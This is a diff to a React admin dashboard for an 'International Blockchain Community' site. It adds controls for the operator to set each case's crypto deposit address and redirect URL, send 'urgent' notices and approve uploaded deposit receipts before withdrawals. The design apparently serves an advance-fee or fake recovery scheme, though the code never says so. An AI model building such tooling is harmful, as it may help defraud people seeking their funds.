@@ -16,7 +16,8 @@ import {
   TableRow 
 } from "@/components/ui/table";
 import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle, DialogFooter } from "@/components/ui/dialog";
-import { ShieldAlert, RefreshCw, Trash2, Lock, Plus, UserCheck, FileText, FolderOpen, Edit3, History, User, LogOut, ShieldCheck, Key, ExternalLink, X, MessageCircle, Send, Bell } from "lucide-react";
+import { ShieldAlert, RefreshCw, Trash2, Lock, Plus, UserCheck, FileText, FolderOpen, Edit3, History, User, LogOut, ShieldCheck, Key, ExternalLink, X, MessageCircle, Send, Bell, AlertTriangle, Clock, CheckCircle, Image, Wallet, Upload } from "lucide-react";
+import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
 import ibcLogo from "@assets/generated_images/professional_corporate_logo_for_international_blockchain_community.png";
 import { useToast } from "@/hooks/use-toast";
 import { motion, AnimatePresence } from "framer-motion";
@@ -41,6 +42,30 @@ interface Case {
   withdrawalAmount?: string;
   withdrawalBatches?: string;
   physilocal0?: string;
+  depositAddress?: string;
+  profileRedirectUrl?: string;
+  hasRequirements?: boolean;
+}
+
+interface AdminMessage {
+  id: number;
+  caseId: string;
+  category: 'urgent' | 'processing' | 'resolved';
+  title: string;
+  body: string;
+  isRead: boolean;
+  createdAt: string;
+}
+
+interface DepositReceipt {
+  id: number;
+  caseId: string;
+  imageData: string;
+  fileName?: string;
+  notes?: string;
+  status: 'pending' | 'approved' | 'rejected';
+  adminNotes?: string;
+  uploadedAt: string;
 }
 
 interface CaseLetter {
@@ -54,6 +79,14 @@ interface CaseLetter {
   optionADescription?: string;
   optionBTitle?: string;
   optionBDescription?: string;
+  optionAAmount?: string;
+  optionABatches?: string;
+  optionATotalAmount?: string;
+  optionAFilelocoId?: string;
+  optionBAmount?: string;
+  optionBBatches?: string;
+  optionBTotalAmount?: string;
+  optionBFilelocoId?: string;
 }
 
 interface Submission {
@@ -145,6 +178,19 @@ export default function AdminDashboard() {
   const lastRegisteredCountRef = useRef(0);
   const lastSubmissionsCountRef = useRef(0);
   const isInitialDataLoadRef = useRef(true);
+  
+  // Admin messages and deposit receipts
+  const [adminMessages, setAdminMessages] = useState<AdminMessage[]>([]);
+  const [depositReceipts, setDepositReceipts] = useState<DepositReceipt[]>([]);
+  const [isAdminMessageOpen, setIsAdminMessageOpen] = useState(false);
+  const [isReceiptsOpen, setIsReceiptsOpen] = useState(false);
+  const [newAdminMessage, setNewAdminMessage] = useState({
+    category: 'processing' as 'urgent' | 'processing' | 'resolved',
+    title: '',
+    body: ''
+  });
+  const [depositAddressEdit, setDepositAddressEdit] = useState("");
+  const [profileRedirectEdit, setProfileRedirectEdit] = useState("");
   
   const { toast } = useToast();
 
@@ -400,7 +446,7 @@ export default function AdminDashboard() {
     setChatMessages([]);
   };
 
-  const sendAdminMessage = async () => {
+  const sendChatMessage = async () => {
     if (!newMessage.trim() || !chatCase || isSendingMessage) return;
     
     setIsSendingMessage(true);
@@ -420,6 +466,120 @@ export default function AdminDashboard() {
       toast({ variant: "destructive", title: "Error", description: "Failed to send message." });
     }
     setIsSendingMessage(false);
+  };
+
+  const loadAdminMessages = async (caseId: string) => {
+    try {
+      const res = await fetch(`/api/cases/${caseId}/admin-messages`);
+      if (res.ok) {
+        const data = await res.json();
+        setAdminMessages(data);
+      }
+    } catch (error) {
+      console.error('Failed to load admin messages:', error);
+    }
+  };
+
+  const loadDepositReceipts = async (caseId: string) => {
+    try {
+      const res = await fetch(`/api/cases/${caseId}/deposit-receipts`);
+      if (res.ok) {
+        const data = await res.json();
+        setDepositReceipts(data);
+      }
+    } catch (error) {
+      console.error('Failed to load deposit receipts:', error);
+    }
+  };
+
+  const openAdminMessageDialog = (caseData: Case) => {
+    setSelectedCase(caseData);
+    loadAdminMessages(caseData.id);
+    setDepositAddressEdit(caseData.depositAddress || "");
+    setProfileRedirectEdit(caseData.profileRedirectUrl || "");
+    setIsAdminMessageOpen(true);
+  };
+
+  const openReceiptsDialog = (caseData: Case) => {
+    setSelectedCase(caseData);
+    loadDepositReceipts(caseData.id);
+    setIsReceiptsOpen(true);
+  };
+
+  const sendNewAdminMessage = async () => {
+    if (!newAdminMessage.title.trim() || !newAdminMessage.body.trim() || !selectedCase) return;
+    
+    try {
+      const res = await fetch(`/api/cases/${selectedCase.id}/admin-messages`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(newAdminMessage)
+      });
+      
+      if (res.ok) {
+        const msg = await res.json();
+        setAdminMessages(prev => [msg, ...prev]);
+        setNewAdminMessage({ category: 'processing', title: '', body: '' });
+        toast({ title: "Message Sent", description: "Admin message has been sent to the user." });
+      }
+    } catch (error) {
+      toast({ variant: "destructive", title: "Error", description: "Failed to send admin message." });
+    }
+  };
+
+  const updateDepositAddress = async () => {
+    if (!selectedCase) return;
+    
+    try {
+      const res = await fetch(`/api/cases/${selectedCase.id}`, {
+        method: 'PATCH',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ depositAddress: depositAddressEdit })
+      });
+      
+      if (res.ok) {
+        loadData();
+        toast({ title: "Updated", description: "Deposit address has been saved." });
+      }
+    } catch (error) {
+      toast({ variant: "destructive", title: "Error", description: "Failed to update deposit address." });
+    }
+  };
+
+  const updateProfileRedirect = async () => {
+    if (!selectedCase) return;
+    
+    try {
+      const res = await fetch(`/api/cases/${selectedCase.id}`, {
+        method: 'PATCH',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ profileRedirectUrl: profileRedirectEdit })
+      });
+      
+      if (res.ok) {
+        loadData();
+        toast({ title: "Updated", description: "Profile redirect URL has been saved." });
+      }
+    } catch (error) {
+      toast({ variant: "destructive", title: "Error", description: "Failed to update profile redirect." });
+    }
+  };
+
+  const updateReceiptStatus = async (receiptId: number, status: 'approved' | 'rejected', adminNotes?: string) => {
+    try {
+      const res = await fetch(`/api/deposit-receipts/${receiptId}`, {
+        method: 'PATCH',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ status, adminNotes })
+      });
+      
+      if (res.ok) {
+        setDepositReceipts(prev => prev.map(r => r.id === receiptId ? { ...r, status, adminNotes } : r));
+        toast({ title: "Receipt Updated", description: `Receipt has been ${status}.` });
+      }
+    } catch (error) {
+      toast({ variant: "destructive", title: "Error", description: "Failed to update receipt status." });
+    }
   };
 
   const clearData = async () => {
@@ -845,20 +1005,40 @@ export default function AdminDashboard() {
                                 </Button>
                               )}
                               {c.status !== 'created' && (
-                                <Button 
-                                  size="sm" 
-                                  variant="outline"
-                                  className="border-blue-700 bg-blue-900/50 text-blue-400 hover:bg-blue-800 relative"
-                                  onClick={() => openChat(c)}
-                                  data-testid={`button-chat-${c.id}`}
-                                >
-                                  <MessageCircle className="w-4 h-4 mr-1" /> Chat
-                                  {unreadCounts[c.id] > 0 && (
-                                    <span className="absolute -top-1 -right-1 h-4 w-4 rounded-full bg-red-500 text-xs text-white flex items-center justify-center font-bold animate-pulse">
-                                      {unreadCounts[c.id]}
-                                    </span>
-                                  )}
-                                </Button>
+                                <>
+                                  <Button 
+                                    size="sm" 
+                                    variant="outline"
+                                    className="border-blue-700 bg-blue-900/50 text-blue-400 hover:bg-blue-800 relative"
+                                    onClick={() => openChat(c)}
+                                    data-testid={`button-chat-${c.id}`}
+                                  >
+                                    <MessageCircle className="w-4 h-4 mr-1" /> Chat
+                                    {unreadCounts[c.id] > 0 && (
+                                      <span className="absolute -top-1 -right-1 h-4 w-4 rounded-full bg-red-500 text-xs text-white flex items-center justify-center font-bold animate-pulse">
+                                        {unreadCounts[c.id]}
+                                      </span>
+                                    )}
+                                  </Button>
+                                  <Button 
+                                    size="sm" 
+                                    variant="outline"
+                                    className="border-purple-700 bg-purple-900/50 text-purple-400 hover:bg-purple-800"
+                                    onClick={() => openAdminMessageDialog(c)}
+                                    data-testid={`button-manage-${c.id}`}
+                                  >
+                                    <Bell className="w-4 h-4 mr-1" /> Manage
+                                  </Button>
+                                  <Button 
+                                    size="sm" 
+                                    variant="outline"
+                                    className="border-amber-700 bg-amber-900/50 text-amber-400 hover:bg-amber-800"
+                                    onClick={() => openReceiptsDialog(c)}
+                                    data-testid={`button-receipts-${c.id}`}
+                                  >
+                                    <Image className="w-4 h-4 mr-1" /> Receipts
+                                  </Button>
+                                </>
                               )}
                             </div>
                           </TableCell>
@@ -1340,13 +1520,13 @@ export default function AdminDashboard() {
                   placeholder="Type your message..."
                   value={newMessage}
                   onChange={(e) => setNewMessage(e.target.value)}
-                  onKeyDown={(e) => e.key === 'Enter' && !e.shiftKey && sendAdminMessage()}
+                  onKeyDown={(e) => e.key === 'Enter' && !e.shiftKey && sendChatMessage()}
                   disabled={isSendingMessage}
                   className="flex-1 bg-slate-800 border-slate-700 text-white placeholder:text-slate-500"
                   data-testid="input-admin-chat-message"
                 />
                 <Button
-                  onClick={sendAdminMessage}
+                  onClick={sendChatMessage}
                   disabled={!newMessage.trim() || isSendingMessage}
                   size="sm"
                   className="bg-blue-600 hover:bg-blue-700"
@@ -1359,6 +1539,217 @@ export default function AdminDashboard() {
           </motion.div>
         )}
       </AnimatePresence>
+
+      {/* Admin Message Dialog */}
+      <Dialog open={isAdminMessageOpen} onOpenChange={setIsAdminMessageOpen}>
+        <DialogContent className="max-w-2xl max-h-[80vh] overflow-y-auto bg-slate-950 border-slate-800 text-white">
+          <DialogHeader>
+            <DialogTitle className="flex items-center gap-2">
+              <Bell className="h-5 w-5 text-blue-500" />
+              Manage User: {selectedCase?.userName}
+            </DialogTitle>
+            <DialogDescription className="text-slate-400">
+              Send messages and configure user settings for case {selectedCase?.accessCode}
+            </DialogDescription>
+          </DialogHeader>
+          
+          <div className="space-y-6 py-4">
+            {/* Deposit Address */}
+            <div className="space-y-2">
+              <Label className="text-slate-300">Deposit Address</Label>
+              <div className="flex gap-2">
+                <Input
+                  value={depositAddressEdit}
+                  onChange={(e) => setDepositAddressEdit(e.target.value)}
+                  placeholder="Enter deposit address (e.g., 0x...)"
+                  className="bg-slate-900 border-slate-700 text-white flex-1"
+                />
+                <Button onClick={updateDepositAddress} size="sm">
+                  <Wallet className="h-4 w-4 mr-1" /> Save
+                </Button>
+              </div>
+            </div>
+
+            {/* Profile Redirect URL */}
+            <div className="space-y-2">
+              <Label className="text-slate-300">Profile Redirect URL</Label>
+              <div className="flex gap-2">
+                <Input
+                  value={profileRedirectEdit}
+                  onChange={(e) => setProfileRedirectEdit(e.target.value)}
+                  placeholder="https://..."
+                  className="bg-slate-900 border-slate-700 text-white flex-1"
+                />
+                <Button onClick={updateProfileRedirect} size="sm">
+                  <ExternalLink className="h-4 w-4 mr-1" /> Save
+                </Button>
+              </div>
+            </div>
+
+            {/* Send New Message */}
+            <div className="space-y-3 p-4 bg-slate-900/50 rounded-lg border border-slate-800">
+              <h4 className="font-semibold text-white flex items-center gap-2">
+                <MessageCircle className="h-4 w-4" /> Send Admin Message
+              </h4>
+              <div className="grid grid-cols-2 gap-3">
+                <div className="space-y-2">
+                  <Label className="text-slate-400 text-xs">Category</Label>
+                  <Select 
+                    value={newAdminMessage.category} 
+                    onValueChange={(v) => setNewAdminMessage(prev => ({ ...prev, category: v as any }))}
+                  >
+                    <SelectTrigger className="bg-slate-800 border-slate-700">
+                      <SelectValue />
+                    </SelectTrigger>
+                    <SelectContent>
+                      <SelectItem value="urgent">
+                        <span className="flex items-center gap-2 text-red-400">
+                          <AlertTriangle className="h-3 w-3" /> Urgent
+                        </span>
+                      </SelectItem>
+                      <SelectItem value="processing">
+                        <span className="flex items-center gap-2 text-amber-400">
+                          <Clock className="h-3 w-3" /> Processing
+                        </span>
+                      </SelectItem>
+                      <SelectItem value="resolved">
+                        <span className="flex items-center gap-2 text-green-400">
+                          <CheckCircle className="h-3 w-3" /> Resolved
+                        </span>
+                      </SelectItem>
+                    </SelectContent>
+                  </Select>
+                </div>
+                <div className="space-y-2">
+                  <Label className="text-slate-400 text-xs">Title</Label>
+                  <Input
+                    value={newAdminMessage.title}
+                    onChange={(e) => setNewAdminMessage(prev => ({ ...prev, title: e.target.value }))}
+                    placeholder="Message title..."
+                    className="bg-slate-800 border-slate-700"
+                  />
+                </div>
+              </div>
+              <div className="space-y-2">
+                <Label className="text-slate-400 text-xs">Message Body</Label>
+                <Textarea
+                  value={newAdminMessage.body}
+                  onChange={(e) => setNewAdminMessage(prev => ({ ...prev, body: e.target.value }))}
+                  placeholder="Enter your message..."
+                  className="bg-slate-800 border-slate-700 min-h-[100px]"
+                />
+              </div>
+              <Button onClick={sendNewAdminMessage} className="w-full">
+                <Send className="h-4 w-4 mr-2" /> Send Message
+              </Button>
+            </div>
+
+            {/* Previous Messages */}
+            <div className="space-y-3">
+              <h4 className="font-semibold text-white">Sent Messages</h4>
+              {adminMessages.length === 0 ? (
+                <p className="text-slate-500 text-sm text-center py-4">No messages sent yet</p>
+              ) : (
+                <div className="space-y-2 max-h-48 overflow-y-auto">
+                  {adminMessages.map(msg => (
+                    <div key={msg.id} className="p-3 bg-slate-900 rounded border border-slate-800">
+                      <div className="flex items-center gap-2 mb-1">
+                        {msg.category === 'urgent' && <AlertTriangle className="h-3 w-3 text-red-400" />}
+                        {msg.category === 'processing' && <Clock className="h-3 w-3 text-amber-400" />}
+                        {msg.category === 'resolved' && <CheckCircle className="h-3 w-3 text-green-400" />}
+                        <span className="font-medium text-sm">{msg.title}</span>
+                        {msg.isRead && <Badge variant="outline" className="text-xs">Read</Badge>}
+                      </div>
+                      <p className="text-xs text-slate-400 line-clamp-2">{msg.body}</p>
+                      <p className="text-xs text-slate-600 mt-1">{new Date(msg.createdAt).toLocaleString()}</p>
+                    </div>
+                  ))}
+                </div>
+              )}
+            </div>
+          </div>
+        </DialogContent>
+      </Dialog>
+
+      {/* Deposit Receipts Dialog */}
+      <Dialog open={isReceiptsOpen} onOpenChange={setIsReceiptsOpen}>
+        <DialogContent className="max-w-3xl max-h-[80vh] overflow-y-auto bg-slate-950 border-slate-800 text-white">
+          <DialogHeader>
+            <DialogTitle className="flex items-center gap-2">
+              <Image className="h-5 w-5 text-amber-500" />
+              Deposit Receipts: {selectedCase?.userName}
+            </DialogTitle>
+            <DialogDescription className="text-slate-400">
+              Review and approve/reject deposit receipts for case {selectedCase?.accessCode}
+            </DialogDescription>
+          </DialogHeader>
+          
+          <div className="py-4">
+            {depositReceipts.length === 0 ? (
+              <div className="text-center py-12">
+                <Image className="h-12 w-12 mx-auto text-slate-700 mb-3" />
+                <p className="text-slate-500">No receipts uploaded yet</p>
+              </div>
+            ) : (
+              <div className="space-y-4">
+                {depositReceipts.map(receipt => (
+                  <div key={receipt.id} className="p-4 bg-slate-900 rounded-lg border border-slate-800">
+                    <div className="flex gap-4">
+                      {receipt.imageData && (
+                        <img 
+                          src={receipt.imageData} 
+                          alt="Receipt" 
+                          className="w-32 h-32 object-cover rounded cursor-pointer hover:opacity-80"
+                          onClick={() => window.open(receipt.imageData, '_blank')}
+                        />
+                      )}
+                      <div className="flex-1">
+                        <div className="flex justify-between items-start mb-2">
+                          <div>
+                            <p className="font-semibold">{receipt.fileName || 'Receipt'}</p>
+                            <p className="text-xs text-slate-500">{new Date(receipt.uploadedAt).toLocaleString()}</p>
+                          </div>
+                          <Badge variant={
+                            receipt.status === 'approved' ? 'default' :
+                            receipt.status === 'rejected' ? 'destructive' :
+                            'secondary'
+                          }>
+                            {receipt.status}
+                          </Badge>
+                        </div>
+                        {receipt.notes && (
+                          <p className="text-sm text-slate-400 mb-3">User notes: {receipt.notes}</p>
+                        )}
+                        {receipt.adminNotes && (
+                          <p className="text-sm text-slate-500 mb-3">Admin notes: {receipt.adminNotes}</p>
+                        )}
+                        {receipt.status === 'pending' && (
+                          <div className="flex gap-2">
+                            <Button 
+                              size="sm" 
+                              onClick={() => updateReceiptStatus(receipt.id, 'approved')}
+                              className="bg-green-600 hover:bg-green-700"
+                            >
+                              <CheckCircle className="h-4 w-4 mr-1" /> Approve
+                            </Button>
+                            <Button 
+                              size="sm" 
+                              variant="destructive"
+                              onClick={() => updateReceiptStatus(receipt.id, 'rejected')}
+                            >
+                              <X className="h-4 w-4 mr-1" /> Reject
+                            </Button>
+                          </div>
+                        )}
+                      </div>
+                    </div>
+                  </div>
+                ))}
+              </div>
+            )}
+          </div>
+        </DialogContent>
+      </Dialog>
 
       {/* Notification Bell for Total Unread */}
       {isLoggedIn && totalUnread > 0 && (
